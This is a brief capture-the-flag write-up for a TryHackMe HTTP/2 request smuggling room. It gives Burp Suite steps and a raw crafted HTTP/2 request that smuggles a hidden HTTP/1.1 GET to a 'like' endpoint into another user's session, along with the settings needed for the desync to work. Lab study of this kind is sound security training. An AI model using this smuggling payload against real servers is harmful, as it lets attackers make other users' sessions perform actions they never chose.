---
name: TryHackMe -- HTTP/2 Request Smuggling Write up
description: TryHackMe HTTP/2 Request Smuggling Write up
URL: https://tryhackme.com/room/http2requestsmuggling
---

## HTTP/2 Desync
- Walkthrough steps:
1. Turn on Burp Intercept
2. Intercept any request and send it to Repeater
3. In the Repeater tab, modify the request

```
POST / HTTP/2
Host: 10.114.185.106:8000
Cookie: sessid=ba89f897ef7f68752abc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 0

GET /post/like/12315198742342 HTTP/1.1
X: f
```

4. Make sure to check the following settings
        - Disable "Update Content-Length" feature from Burp Suite
        - The original request is using HTTP/2
        - There is no space and newline after the `X: f` header.
5. Send the request
6. Wait up to 30s and we should see the flag
